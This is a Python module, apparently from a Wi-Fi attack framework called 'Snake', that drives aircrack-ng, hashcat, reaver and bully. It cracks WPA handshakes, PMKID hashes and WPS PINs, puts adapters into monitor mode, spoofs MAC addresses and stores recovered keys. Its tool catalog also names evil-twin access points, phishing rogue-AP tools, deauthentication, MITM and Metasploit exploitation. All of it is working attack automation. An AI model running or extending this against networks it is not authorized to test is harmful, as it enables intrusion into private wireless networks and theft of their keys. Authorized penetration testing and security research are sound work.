#!/usr/bin/env python3
"""
Snake Framework - Tool Manager
Manages aircrack-ng, hashcat, hcxtools, wifite, reaver, bully, etc.
"""
import subprocess
import shutil
import os
import re
import json
import time
import signal
import threading
from pathlib import Path
from typing import Callable, Optional, Tuple

from .ap_support import quiet_networkmanager_on, restore_networkmanager_on
from .cracked_store import append_cracked, is_valid_cracked_entry
from .paths import (
    BUILTIN_WORDLIST,
    CAPTURES_DIR,
    CRACKED_FILE,
    LOGS_DIR,
    REPO_DIR,
    RESULTS_DIR,
    WORDLISTS_DIR,
    ensure_runtime_dirs,
)
from .wordlists import (
    cascade_wordlists,
    get_active_wordlist,
    resolve_wordlist,
    wordlist_priority,
    write_target_wordlist,
)

CAPTURES = CAPTURES_DIR
RESULTS = RESULTS_DIR
WORDLISTS = WORDLISTS_DIR
LOGS = LOGS_DIR
ensure_runtime_dirs()
_result_lock = threading.Lock()

WORDLIST_PRIORITY = wordlist_priority()


BSSID_RE = re.compile(r"^(?:[0-9A-F]{2}:){5}[0-9A-F]{2}$")


def normalize_bssid(value: str) -> str:
    """Normalize MAC to AA:BB:CC:DD:EE:FF."""
    raw = re.sub(r"[^0-9A-Fa-f]", "", str(value or "")).upper()
    if len(raw) != 12:
        return str(value or "").strip().upper().replace("-", ":")
    return ":".join(raw[i : i + 2] for i in range(0, 12, 2))


def is_valid_bssid(value: str) -> bool:
    return bool(BSSID_RE.match(normalize_bssid(value)))


def get_wordlist() -> Optional[str]:
    return get_active_wordlist()


HANDSHAKE_CAP_RE = re.compile(
    r"^handshake_(?P<essid>[A-Za-z0-9]+)_(?P<bssid>[0-9A-Fa-f-]{17})_",
    re.IGNORECASE,
)


def parse_handshake_cap_path(cap_path: str) -> Tuple[Optional[str], Optional[str]]:
    """Read BSSID/ESSID from a wifite2 handshake filename."""
    match = HANDSHAKE_CAP_RE.match(Path(cap_path).name)
    if not match:
        return None, None
    bssid = match.group("bssid").replace("-", ":").upper()
    essid = match.group("essid")
    return bssid, essid


def find_handshake_cap(
    hs_dir: str,
    bssid: str,
    essid: str = "",
    min_mtime: float = 0,
) -> Optional[str]:
    """Return the newest handshake capture for the given target."""
    directory = Path(hs_dir)
    if not directory.is_dir():
        return None
    bssid_safe = re.escape(bssid.replace(":", "-"))
    if essid:
        essid_safe = re.escape(re.sub(r"[^a-zA-Z0-9]", "", essid))
    else:
        essid_safe = r"[A-Za-z0-9]+"
    pattern = re.compile(
        rf"^handshake_{essid_safe}_{bssid_safe}_"
        r"\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}\.cap$"
    )
    matches = []
    for path in directory.glob("handshake_*.cap"):
        if path.stat().st_mtime < min_mtime:
            continue
        if pattern.match(path.name):
            matches.append(path)
    if not matches:
        for path in directory.glob(f"handshake_*_{bssid_safe}_*.cap"):
            if path.stat().st_mtime >= min_mtime:
                matches.append(path)
    if not matches:
        return None
    return str(max(matches, key=lambda item: item.stat().st_mtime))


def build_wifite_command(
    wifite_path: str,
    iface: str,
    *,
    bssid: str = "",
    essid: str = "",
    channel: int = 0,
    wordlist: str = "",
    wpa: bool = True,
    no_wps: bool = True,
    kill: bool = True,
    no_crack: bool = False,
) -> list:
    """Build a wifite2 CLI argv list using supported flags (-i, -b, -e, -c)."""
    cmd = ["python3", wifite_path]
    if kill:
        cmd.append("--kill")
    cmd += ["-i", iface]
    if bssid:
        cmd += ["-b", bssid.upper()]
    if essid:
        cmd += ["-e", essid]
    if channel and channel > 0:
        cmd += ["-c", str(channel)]
    if no_wps:
        cmd.append("--no-wps")
    if wpa:
        cmd.append("--wpa")
    if no_crack:
        cmd.append("--no-crack")
    elif wordlist and Path(wordlist).is_file():
        cmd += ["--dict", wordlist]
    return cmd


def hashcat_has_compute_backend() -> bool:
    """True when hashcat reports at least one usable OpenCL/CUDA/HIP device."""
    if not shutil.which("hashcat"):
        return False
    try:
        result = subprocess.run(
            ["hashcat", "-I"],
            capture_output=True,
            text=True,
            timeout=20,
        )
    except (OSError, subprocess.TimeoutExpired):
        return False
    combined = f"{result.stdout or ''}\n{result.stderr or ''}"
    if "CL_PLATFORM_NOT_FOUND" in combined:
        return False
    if re.search(r"Type\s*\.+:\s*(GPU|CPU)", combined, re.IGNORECASE):
        return True
    if "No platforms found" in combined:
        return False
    return result.returncode == 0


TOOL_CATALOG = {
    "airmon-ng":      {"required": True,  "package": "aircrack-ng"},
    "airodump-ng":    {"required": True,  "package": "aircrack-ng"},
    "aireplay-ng":    {"required": False, "package": "aircrack-ng"},
    "aircrack-ng":    {"required": True,  "package": "aircrack-ng"},
    "hashcat":        {"required": False, "package": "hashcat"},
    "hcxdumptool":    {"required": False, "package": "hcxdumptool"},
    "hcxtools":       {"required": False, "package": "hcxtools"},
    "hcxpcapngtool":  {"required": False, "package": "hcxtools"},
    "wifite":         {"required": False, "package": ""},
    "reaver":         {"required": False, "package": "reaver"},
    "bully":          {"required": False, "package": "bully"},
    "macchanger":     {"required": False, "package": "macchanger"},
    "tshark":         {"required": False, "package": "tshark"},
    "nmap":           {"required": False, "package": "nmap", "purpose": "MITM / Strike LAN recon"},
    "nxc":            {"required": False, "package": "netexec", "purpose": "Strike SMB/SSH/WinRM vuln checks"},
    "msfconsole":     {"required": False, "package": "metasploit-framework", "purpose": "Strike automated exploitation"},
    "cowpatty":       {"required": False, "package": "cowpatty"},
    "bettercap":      {"required": False, "package": "bettercap", "purpose": "MITM engine"},
    "arp-scan":       {"required": False, "package": "arp-scan", "purpose": "MITM LAN host discovery"},
    "tcpdump":        {"required": False, "package": "tcpdump"},
    "hostapd":        {"required": False, "package": "hostapd", "purpose": "Evil Twin access point"},
    "dnsmasq":        {"required": False, "package": "dnsmasq", "purpose": "Evil Twin DHCP and DNS"},
    "mdk4":           {"required": False, "package": "mdk4", "purpose": "RF deauth / beacon / auth"},
    "mdk3":           {"required": False, "package": "mdk3", "purpose": "RF deauth / beacon / auth fallback"},
    "wpa_supplicant": {"required": False, "package": "wpasupplicant", "purpose": "Air-to-LAN pivot / PSK verify"},
    "dhclient":       {"required": False, "package": "isc-dhcp-client", "purpose": "DHCP lease after pivot"},
    "wash":           {"required": False, "package": "reaver", "purpose": "WPS-enabled AP discovery"},
    "ncrack":         {"required": False, "package": "ncrack", "purpose": "Parallel login audit (Strike / Arsenal)"},
    "wifiphisher":    {"required": False, "package": "wifiphisher", "purpose": "Social evil-twin scenarios"},
    "wifipumpkin3":   {"required": False, "package": "wifipumpkin3", "purpose": "Modular rogue AP + phishing plugins"},
    "eaphammer":      {"required": False, "package": "eaphammer", "purpose": "WPA2-Enterprise evil twin"},
    "hydra":          {"required": False, "package": "hydra", "purpose": "Optional HTTP/Telnet brute (manual)"},
}


_SBIN_PREFIXES = ("/usr/sbin", "/sbin", "/usr/bin", "/bin")


def find_executable(*candidates: str) -> Optional[str]:
    """Resolve a binary by name or absolute path."""
    for candidate in candidates:
        if not candidate:
            continue
        if candidate.startswith("/"):
            path = Path(candidate)
            if path.is_file() and os.access(path, os.X_OK):
                return str(path)
            continue
        found = shutil.which(candidate)
        if found:
            return found
        for prefix in _SBIN_PREFIXES:
            path = Path(prefix) / candidate
            if path.is_file() and os.access(path, os.X_OK):
                return str(path)
    return None


def check_tools() -> dict:
    """Return availability of all Snake tools."""
    local_wifite = REPO_DIR / "Wifite.py"
    tools = {
        "airmon-ng":      find_executable("airmon-ng"),
        "airodump-ng":    find_executable("airodump-ng"),
        "aireplay-ng":    find_executable("aireplay-ng"),
        "aircrack-ng":    find_executable("aircrack-ng"),
        "hashcat":        find_executable("hashcat"),
        "hcxdumptool":    find_executable("hcxdumptool"),
        "hcxtools":       find_executable("hcxpcapngtool", "hcxtools"),
        "hcxpcapngtool":  find_executable("hcxpcapngtool"),
        "wifite":         find_executable("wifite") or (
            str(local_wifite) if local_wifite.is_file() else None
        ),
        "reaver":         find_executable("reaver"),
        "bully":          find_executable("bully"),
        "macchanger":     find_executable("macchanger"),
        "tshark":         find_executable("tshark"),
        "nmap":           find_executable("nmap"),
        "nxc":            find_executable("nxc", "netexec"),
        "msfconsole":     find_executable("msfconsole", "/usr/bin/msfconsole"),
        "cowpatty":       find_executable("cowpatty"),
        "bettercap":      find_executable("bettercap"),
        "arp-scan":       find_executable("arp-scan", "/usr/sbin/arp-scan", "/usr/bin/arp-scan"),
        "tcpdump":        find_executable("tcpdump"),
        "hostapd":        find_executable("hostapd"),
        "dnsmasq":        find_executable("dnsmasq"),
        "mdk4":           find_executable("mdk4"),
        "mdk3":           find_executable("mdk3"),
        "wpa_supplicant": find_executable("wpa_supplicant"),
        "dhclient":       find_executable("dhclient", "dhcpcd", "udhcpc"),
        "wash":           find_executable("wash"),
        "ncrack":         find_executable("ncrack"),
        "wifiphisher":    find_executable("wifiphisher"),
        "wifipumpkin3":   find_executable("wifipumpkin3"),
        "eaphammer":      find_executable("eaphammer", "/usr/share/eaphammer/eaphammer"),
        "hydra":          find_executable("hydra"),
    }
    return {k: bool(v) for k, v in tools.items()}


def get_tools_detail() -> dict:
    """Tool readiness plus optional/required metadata for the UI."""
    tools = check_tools()
    entries = []
    for name, meta in TOOL_CATALOG.items():
        ready = tools.get(name, False)
        package = meta.get("package") or ""
        entries.append({
            "name": name,
            "ready": ready,
            "required": bool(meta.get("required")),
            "optional": not meta.get("required"),
            "package": package,
            "purpose": meta.get("purpose", ""),
            "install": f"sudo apt install {package}" if package and not ready else "",
        })
    required_missing = [e["name"] for e in entries if e["required"] and not e["ready"]]
    optional_missing = [e["name"] for e in entries if e["optional"] and not e["ready"]]
    return {
        "tools": tools,
        "entries": entries,
        "required_missing": required_missing,
        "optional_missing": optional_missing,
    }


AIRMON_MONITOR_RE = re.compile(
    r"monitor mode(?: vif)? enabled(?: for \[[^\]]+\]\S+)? on (?:\[[^\]]+\])?(\S+)",
    re.IGNORECASE,
)


def _unique(items: list) -> list:
    seen = set()
    result = []
    for item in items:
        if item and item not in seen:
            seen.add(item)
            result.append(item)
    return result


def get_interfaces() -> list:
    """List wireless interfaces from iw and /proc/net/wireless."""
    ifaces = []
    try:
        out = subprocess.check_output(["iw", "dev"], text=True, timeout=5)
        ifaces.extend(re.findall(r"Interface\s+(\S+)", out))
    except Exception:
        pass
    try:
        with open("/proc/net/wireless") as f:
            for line in f.readlines()[2:]:
                iface = line.strip().split(":")[0].strip()
                if iface:
                    ifaces.append(iface)
    except Exception:
        pass
    return _unique(ifaces)


# Linux ARPHRD_* values used by monitor-mode wireless interfaces.
_ARPHRD_MONITOR = {801, 802, 803}


def get_interface_phy(iface: str) -> str:
    """Return the 802.11 phy name (phy0) for a wireless interface."""
    if not iface:
        return ""
    try:
        link = os.readlink(f"/sys/class/net/{iface}/phy80211")
        return os.path.basename(link)
    except OSError:
        pass
    try:
        out = subprocess.check_output(
            ["iw", "dev", iface, "info"],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=5,
        )
        match = re.search(r"wiphy\s+(\d+)", out)
        if match:
            return f"phy{match.group(1)}"
    except Exception:
        pass
    return ""


def classify_wireless_ifaces() -> dict:
    """Split wireless adapters into managed and monitor roles."""
    items = []
    for name in get_interfaces():
        items.append({
            "name": name,
            "mode": get_interface_mode(name),
            "phy": get_interface_phy(name),
        })
    return {
        "interfaces": items,
        "managed": [item["name"] for item in items if item["mode"] == "managed"],
        "monitor": [item["name"] for item in items if item["mode"] == "monitor"],
    }


def get_interface_mode(iface: str) -> str:
    """Returns 'monitor', 'managed', or 'unknown'. Monitor wins if sources disagree."""
    if not iface:
        return "unknown"

    try:
        arphrd = int(Path(f"/sys/class/net/{iface}/type").read_text(encoding="utf-8").strip())
        if arphrd in _ARPHRD_MONITOR:
            return "monitor"
    except (OSError, ValueError):
        pass

    managed_vote = False
    try:
        out = subprocess.check_output(
            ["iw", "dev", iface, "info"],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=5,
        )
        match = re.search(r"^\s*type\s+(\S+)", out, re.MULTILINE)
        if match:
            kind = match.group(1).lower()
            if kind == "monitor":
                return "monitor"
            if kind in {"managed", "station", "ap", "ap_vlan"}:
                managed_vote = True
    except Exception:
        pass

    try:
        out = subprocess.check_output(
            ["iwconfig", iface],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=5,
        )
        if re.search(r"mode[:\s]+monitor", out, re.IGNORECASE):
            return "monitor"
        if re.search(r"mode[:\s]+managed", out, re.IGNORECASE):
            managed_vote = True
    except Exception:
        pass

    if managed_vote:
        return "managed"
    return "unknown"


def parse_airmon_monitor_iface(output: str, requested: str) -> Optional[str]:
    """Extract the monitor interface name from airmon-ng output."""
    match = AIRMON_MONITOR_RE.search(output or "")
    if match:
        return match.group(1).rstrip(")")
    if requested and "monitor mode" in (output or "").lower():
        if f"{requested}mon" in output:
            return f"{requested}mon"
        if requested in output:
            return requested
    return None


def _find_monitor_iface(candidates: list) -> Optional[str]:
    present = set(get_interfaces())
    for name in _unique(candidates):
        if name in present and get_interface_mode(name) == "monitor":
            return name
    for name in get_interfaces():
        if get_interface_mode(name) == "monitor":
            return name
    return None


def _run_cmd(cmd: list, timeout: int = 15) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _iw_enable_monitor(iface: str, callback: Optional[Callable] = None) -> Optional[str]:
    """Enable monitor mode with iw, keeping the same name when possible."""
    def _cb(msg):
        if callback:
            callback(msg)

    _cb(f"[*] iw: bringing {iface} down")
    _run_cmd(["ip", "link", "set", iface, "down"])
    added = f"{iface}mon" if not iface.endswith("mon") else ""
    if added:
        add = _run_cmd(["iw", "dev", iface, "interface", "add", added, "type", "monitor"])
        if add.returncode == 0:
            _run_cmd(["ip", "link", "set", added, "up"])
            if get_interface_mode(added) == "monitor":
                return added
    change = _run_cmd(["iw", "dev", iface, "set", "type", "monitor"])
    _run_cmd(["ip", "link", "set", iface, "up"])
    if change.returncode == 0 and get_interface_mode(iface) == "monitor":
        return iface
    return None


def set_monitor_mode(iface: str, callback: Optional[Callable] = None) -> str:
    """Enable monitor mode; returns the verified monitor interface name."""
    def _cb(msg):
        if callback:
            callback(msg)

    if not iface:
        raise RuntimeError("No wireless interface selected")
    if os.geteuid() != 0:
        raise RuntimeError(
            "Monitor mode requires root. Start Snake with: sudo .venv/bin/python snake.py server"
        )
    if get_interface_mode(iface) == "monitor":
        _cb(f"[+] Already in monitor mode: {iface}")
        return iface

    already = _find_monitor_iface([f"{iface}mon", iface])
    if already:
        _cb(f"[+] Monitor interface already present: {already}")
        return already

    output = ""
    quiet_networkmanager_on(iface, callback)
    if shutil.which("airmon-ng"):
        _cb(f"[*] airmon-ng start {iface} (NetworkManager kept alive for Ethernet/MITM)")
        result = _run_cmd(["airmon-ng", "start", iface], timeout=20)
        output = (result.stdout or "") + (result.stderr or "")
        if output.strip():
            _cb(output.strip())
        time.sleep(0.8)
        parsed = parse_airmon_monitor_iface(output, iface)
        found = _find_monitor_iface([parsed, f"{iface}mon", iface] if parsed else [f"{iface}mon", iface])
        if found:
            _cb(f"[+] Monitor mode active: {found}")
            return found
        _cb("[*] airmon-ng did not confirm monitor mode; trying iw")
    elif shutil.which("iw") is None:
        raise RuntimeError("Neither airmon-ng nor iw is installed")

    found = _iw_enable_monitor(iface, callback=callback)
    if found:
        _cb(f"[+] Monitor mode active: {found}")
        return found

    detail = output.strip() or "airmon-ng/iw produced no monitor interface"
    raise RuntimeError(
        f"Could not enable monitor mode on {iface}. {detail}. "
        "Confirm the adapter supports monitor mode and Snake is running as root."
    )


def set_managed_mode(
    iface: str,
    callback: Optional[Callable] = None,
    restart_networkmanager: bool = True,
) -> str:
    """Switch back to managed mode and verify the result.

    Twin AP sessions must pass restart_networkmanager=False. Starting
    NetworkManager here lets it reclaim the radio and hostapd then logs
    INTERFACE-DISABLED / handle_probe_req send failed.
    """
    def _cb(msg):
        if callback:
            callback(msg)

    if not iface:
        raise RuntimeError("No wireless interface selected")
    if os.geteuid() != 0:
        raise RuntimeError(
            "Managed mode switch requires root. Start Snake with: sudo .venv/bin/python snake.py server"
        )

    if get_interface_mode(iface) == "managed":
        if restart_networkmanager:
            restore_networkmanager_on(
                {"iface": iface, "nm_was_active": True},
                callback,
            )
        _cb(f"[+] Already in managed mode: {iface}")
        return iface

    base = iface[:-3] if iface.endswith("mon") else iface.replace("mon", "") or iface
    _cb(f"[*] Stopping monitor on {iface}...")
    if shutil.which("airmon-ng"):
        _run_cmd(["airmon-ng", "stop", iface], timeout=15)
        time.sleep(0.4)
    else:
        _run_cmd(["ip", "link", "set", iface, "down"])
        _run_cmd(["iw", "dev", iface, "set", "type", "managed"])
        _run_cmd(["ip", "link", "set", iface, "up"])

    if restart_networkmanager:
        subprocess.run(
            ["systemctl", "start", "NetworkManager"],
            capture_output=True,
            timeout=15,
            check=False,
        )
        time.sleep(0.5)
    else:
        _cb("[*] Skipping NetworkManager restart so the Twin AP can hold the radio")
        time.sleep(0.3)

    for candidate in _unique([base, iface]):
        if candidate in get_interfaces() and get_interface_mode(candidate) != "monitor":
            if restart_networkmanager:
                restore_networkmanager_on(
                    {"iface": candidate, "nm_was_active": True},
                    callback,
                )
            _cb(f"[+] Managed interface: {candidate}")
            return candidate

    if base in get_interfaces():
        return base
    raise RuntimeError(f"Could not restore managed mode from {iface}")


def change_mac(iface: str, mode: str) -> str:
    """Randomize or restore an interface MAC address."""
    if not re.fullmatch(r"[A-Za-z0-9_.:-]{1,32}", iface):
        raise ValueError("Invalid interface name")
    if mode not in {"random", "reset"}:
        raise ValueError("Mode must be 'random' or 'reset'")
    if iface not in get_interfaces():
        raise ValueError(f"Unknown wireless interface: {iface}")
    if not shutil.which("macchanger"):
        raise RuntimeError("macchanger is not installed")

    option = "-r" if mode == "random" else "-p"
    subprocess.run(["ip", "link", "set", iface, "down"], check=True, timeout=10)
    try:
        result = subprocess.run(
            ["macchanger", option, iface],
            check=True,
            capture_output=True,
            text=True,
            timeout=20,
        )
    finally:
        subprocess.run(["ip", "link", "set", iface, "up"], check=False, timeout=10)
    return (result.stdout or result.stderr).strip()


class ProcessRunner:
    """Run a subprocess and stream output via callback."""

    def __init__(self, cmd: list, log_file: Optional[str] = None,
                 callback: Optional[Callable] = None, timeout: int = 0):
        self.cmd      = cmd
        self.log_file = log_file
        self.callback = callback
        self.timeout  = timeout
        self.proc     = None
        self._thread  = None
        self.output   = []
        self.returncode = None
        self._timer = None

    def start(self):
        self.proc = subprocess.Popen(
            self.cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            start_new_session=True,
        )
        self._thread = threading.Thread(target=self._reader, daemon=True)
        self._thread.start()
        if self.timeout > 0:
            self._timer = threading.Timer(self.timeout, self.kill)
            self._timer.daemon = True
            self._timer.start()
        return self

    def _reader(self):
        log_fh = open(self.log_file, "a") if self.log_file else None
        try:
            for line in self.proc.stdout:
                line = line.rstrip()
                self.output.append(line)
                if self.callback:
                    self.callback(line)
                if log_fh:
                    log_fh.write(line + "\n")
                    log_fh.flush()
        finally:
            if log_fh:
                log_fh.close()
        self.proc.wait()
        self.returncode = self.proc.returncode
        if self._timer:
            self._timer.cancel()

    def kill(self):
        if self.proc and self.proc.poll() is None:
            try:
                os.killpg(self.proc.pid, signal.SIGTERM)
            except (ProcessLookupError, PermissionError):
                self.proc.terminate()
            time.sleep(0.5)
            if self.proc.poll() is None:
                try:
                    os.killpg(self.proc.pid, signal.SIGKILL)
                except (ProcessLookupError, PermissionError):
                    self.proc.kill()

    def wait(self, timeout: int = None):
        if self._thread:
            self._thread.join(timeout=timeout)
        return self.returncode

    def is_running(self):
        return self.proc is not None and self.proc.poll() is None


class CrackEngine:
    """Unified cracking engine: aircrack-ng + hashcat + WPS."""

    def __init__(self, callback: Optional[Callable] = None,
                 runner_callback: Optional[Callable] = None,
                 wordlist: str = "",
                 should_stop: Optional[Callable] = None):
        self.callback = callback
        self.runner_callback = runner_callback
        self.should_stop = should_stop
        chosen = resolve_wordlist(path=wordlist) if wordlist else resolve_wordlist()
        self.wordlist = chosen["path"] if chosen else get_wordlist()
        self.wordlist_meta = chosen or {}
        self.lists_tried: list = []

    def _cb(self, msg: str):
        if self.callback:
            self.callback(msg)

    def _stopped(self) -> bool:
        return bool(self.should_stop and self.should_stop())

    def _apply_wordlist(self, meta: dict) -> None:
        self.wordlist_meta = meta or {}
        self.wordlist = (meta or {}).get("path") or self.wordlist

    def _resolve_crack_target(
        self, cap_file: str, bssid: str, essid: str
    ) -> Tuple[str, str]:
        cap_bssid, cap_essid = parse_handshake_cap_path(cap_file)
        use_bssid = bssid.upper()
        use_essid = essid
        if cap_bssid and cap_bssid != use_bssid:
            self._cb(
                f"[!] Capture file is for {cap_essid or '?'} ({cap_bssid}), "
                f"not {essid} ({use_bssid}) — using capture identity"
            )
            use_bssid = cap_bssid
            if cap_essid:
                use_essid = cap_essid
        return use_bssid, use_essid

    def crack_handshake_aircrack(self, cap_file: str, bssid: str, essid: str) -> Optional[str]:
        """Try aircrack-ng against a .cap file."""
        if not self.wordlist:
            self._cb("[!] No wordlist found for aircrack-ng")
            return None
        if not Path(cap_file).is_file():
            self._cb(f"[!] Handshake capture not found: {cap_file}")
            return None

        use_bssid, use_essid = self._resolve_crack_target(cap_file, bssid, essid)
        timeout = int(self.wordlist_meta.get("timeout") or 300)
        self._cb(
            f"[🐍] aircrack-ng cracking {use_essid} ({use_bssid}) "
            f"with {Path(self.wordlist).name}"
        )
        log = str(LOGS / f"aircrack_{use_bssid.replace(':','-')}_{int(time.time())}.log")
        cmd = ["aircrack-ng", "-w", self.wordlist, "-b", use_bssid, cap_file]
        runner = ProcessRunner(cmd, log_file=log, callback=self._cb, timeout=timeout).start()
        if self.runner_callback:
            self.runner_callback(runner)
        runner.wait()

        output = "\n".join(runner.output)
        key = self._parse_aircrack_key(output)
        if key is not None and not str(key).strip():
            key = None
        if not key and "no matching network found" in output.lower():
            self._cb(
                "[!] aircrack-ng found no handshake for that BSSID in the capture"
            )
        if key:
            self._save_result(use_essid, use_bssid, key, "WPA", cap_file)
        return key

    def crack_pmkid_hashcat(self, hc22000_file: str, bssid: str, essid: str) -> Optional[str]:
        """Crack PMKID hash with hashcat (mode 22000)."""
        if not self.wordlist:
            self._cb("[!] No wordlist found for hashcat")
            return None
        if not hashcat_has_compute_backend():
            self._cb(
                "[!] hashcat skipped: no OpenCL/CUDA/HIP backend "
                "(install PoCL or GPU drivers, or rely on aircrack-ng)"
            )
            return None

        timeout = int(self.wordlist_meta.get("timeout") or 600)
        rule = self.wordlist_meta.get("rule") or ""
        self._cb(
            f"[🐍] hashcat (22000) cracking {essid} with {Path(self.wordlist).name}"
            + (f" + {Path(rule).name}" if rule else "")
        )
        log = str(LOGS / f"hashcat_{bssid.replace(':','-')}_{int(time.time())}.log")
        out_file = str(RESULTS / f"hashcat_{bssid.replace(':','-')}.pot")
        cmd = [
            "hashcat", "-m", "22000",
            "--potfile-path", out_file,
            "-a", "0",
            "-w", "2",
        ]
        if rule:
            cmd += ["-r", rule]
        cmd += [
            hc22000_file, self.wordlist,
            "--quiet", "--status", "--status-timer=5",
        ]
        runner = ProcessRunner(cmd, log_file=log, callback=self._cb, timeout=timeout).start()
        if self.runner_callback:
            self.runner_callback(runner)
        runner.wait()

        output = "\n".join(runner.output)
        if "CL_PLATFORM_NOT_FOUND" in output or "No OpenCL" in output:
            self._cb("[!] hashcat has no compute backend on this system")
            return None
        key = self._parse_hashcat_key(out_file, essid)
        if key is not None and not str(key).strip():
            key = None
        if key:
            self._save_result(essid, bssid, key, "WPA_PMKID", hc22000_file)
        return key

    def _cascade_entries(self, essid: str) -> list:
        entries = []
        target = write_target_wordlist(essid)
        if target:
            entries.append(target)
        start_tier = str(self.wordlist_meta.get("tier") or "")
        start_path = self.wordlist or ""
        entries.extend(cascade_wordlists(tier=start_tier, path=start_path))
        seen = set()
        unique = []
        for entry in entries:
            path = str(Path(entry.get("path") or "").resolve()) if entry.get("path") else ""
            if not path or path in seen:
                continue
            seen.add(path)
            unique.append(entry)
        return unique

    def crack_offline(self, source: str, bssid: str, essid: str, kind: str = "handshake") -> Optional[str]:
        """Try ESSID keys, then the selected tier, then remaining lists."""
        queue = self._cascade_entries(essid)
        self.lists_tried = []
        if not queue:
            self._cb("[!] No local wordlists available")
            return None

        hash_file = source if kind != "handshake" else ""
        use_hashcat = hashcat_has_compute_backend()
        if kind == "handshake" and use_hashcat and shutil.which("hcxpcapngtool"):
            converted = self.convert_cap_to_hc22000(source)
            if converted:
                hash_file = converted

        total = len(queue)
        for index, meta in enumerate(queue, 1):
            if self._stopped():
                return None
            self._apply_wordlist(meta)
            label = meta.get("label") or Path(meta.get("path") or "wordlist").name
            self.lists_tried.append(label)
            count = meta.get("count")
            count_txt = f", {count:,} keys" if isinstance(count, int) and count else ""
            self._cb(f"[📖] Pass {index}/{total}: {label}{count_txt}")

            key = None
            ran_hashcat = False
            if hash_file and use_hashcat:
                key = self.crack_pmkid_hashcat(hash_file, bssid, essid)
                ran_hashcat = True
            if not key and kind == "handshake" and not ran_hashcat:
                key = self.crack_handshake_aircrack(source, bssid, essid)
            if key:
                return key
            nxt = queue[index]["label"] if index < total else "online queue"
            self._cb(f"[!] {label} missed — next: {nxt}")
        return None

    def crack_wps_reaver(self, iface: str, bssid: str, essid: str,
                          pixie: bool = True, channel: int = 0) -> Optional[str]:
        """WPS attack via reaver (pixie-dust by default)."""
        if not shutil.which("reaver"):
            return None
        self._cb(f"[🐍] reaver WPS {'pixie-dust' if pixie else 'bruteforce'} on {essid}...")
        log = str(LOGS / f"reaver_{bssid.replace(':','-')}_{int(time.time())}.log")
        cmd = ["reaver", "-i", iface, "-b", bssid, "-vvv", "-K", "1" if pixie else "0"]
        if channel and channel > 0:
            cmd += ["-c", str(channel)]
        runner = ProcessRunner(cmd, log_file=log, callback=self._cb, timeout=120).start()
        if self.runner_callback:
            self.runner_callback(runner)
        runner.wait()

        key = self._parse_reaver_key("\n".join(runner.output))
        if key:
            self._save_result(essid, bssid, key, "WPS", iface)
        return key

    def crack_wps_bully(self, iface: str, bssid: str, essid: str,
                        pixie: bool = True, channel: int = 0) -> Optional[str]:
        """WPS via bully when reaver fails or is unavailable."""
        if not shutil.which("bully"):
            return None
        self._cb(f"[🐍] bully WPS {'pixie' if pixie else 'PIN'} on {essid}...")
        log = str(LOGS / f"bully_{bssid.replace(':','-')}_{int(time.time())}.log")
        cmd = ["bully", iface, "-b", bssid, "-e", essid or "target", "-v", "3"]
        if channel and channel > 0:
            cmd += ["-c", str(channel)]
        if pixie:
            cmd.append("-d")
        runner = ProcessRunner(cmd, log_file=log, callback=self._cb, timeout=120).start()
        if self.runner_callback:
            self.runner_callback(runner)
        runner.wait()
        output = "\n".join(runner.output)
        key = self._parse_reaver_key(output)
        if not key:
            m = re.search(r"WPA\s+PSK:\s*'?(.+?)'?\s*$", output, re.MULTILINE | re.IGNORECASE)
            key = m.group(1).strip() if m else None
        if key:
            self._save_result(essid, bssid, key, "WPS", iface)
        return key

    def crack_wps(self, iface: str, bssid: str, essid: str,
                  pixie: bool = True, channel: int = 0) -> Optional[str]:
        """Try reaver, then bully (matches wifite2 fallback behavior)."""
        key = self.crack_wps_reaver(iface, bssid, essid, pixie=pixie, channel=channel)
        if key:
            return key
        if shutil.which("bully"):
            self._cb("[*] reaver missed — trying bully")
            return self.crack_wps_bully(iface, bssid, essid, pixie=pixie, channel=channel)
        return None

    def convert_cap_to_hc22000(self, cap_file: str) -> Optional[str]:
        """Convert .cap to hashcat 22000 format using hcxpcapngtool."""
        out = str(CAPTURES / Path(cap_file).stem) + ".hc22000"
        cmd = ["hcxpcapngtool", "-o", out, cap_file]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if Path(out).exists() and Path(out).stat().st_size > 0:
            self._cb(f"[+] Converted to hc22000: {out}")
            return out
        self._cb(f"[!] hcxpcapngtool failed: {result.stderr}")
        return None

    def _parse_aircrack_key(self, output: str) -> Optional[str]:
        m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output, re.IGNORECASE)
        if not m:
            return None
        key = m.group(1).strip()
        return key or None

    def _parse_hashcat_key(self, pot_file: str, essid: str) -> Optional[str]:
        try:
            with open(pot_file) as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 2:
                        key = parts[-1].strip()
                        if key:
                            return key
        except Exception:
            pass
        return None

    def _parse_reaver_key(self, output: str) -> Optional[str]:
        m = re.search(r"WPA PSK:\s*'?(.+?)'?\s*$", output, re.MULTILINE | re.IGNORECASE)
        if m:
            return m.group(1).strip()
        m = re.search(r"WPS PIN:\s*'?(\d{8})'?", output, re.IGNORECASE)
        return m.group(1) if m else None

    def _save_result(self, essid: str, bssid: str, key: str,
                     attack_type: str, source_file: str):
        entry = {
            "type":  attack_type,
            "date":  int(time.time()),
            "essid": essid,
            "bssid": bssid,
            "key":   (key or "").strip(),
            "source": source_file,
        }
        if not is_valid_cracked_entry(entry):
            self._cb(f"[!] Not saving crack for {essid}: empty or invalid key")
            return

        with _result_lock:
            append_cracked(entry, paths=[RESULTS / "cracked.json", CRACKED_FILE])

        self._cb(f"[🏆] CRACKED! {essid} → {entry['key']}")
        self._cb(f"[💾] Saved to {CRACKED_FILE}")


def _load_results(path: Path) -> list:
    try:
        with path.open(encoding="utf-8") as handle:
            data = json.load(handle)
        return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


def _atomic_json_write(path: Path, data: list) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_suffix(path.suffix + ".tmp")
    with temporary.open("w", encoding="utf-8") as handle:
        json.dump(data, handle, indent=2)
        handle.flush()
        os.fsync(handle.fileno())
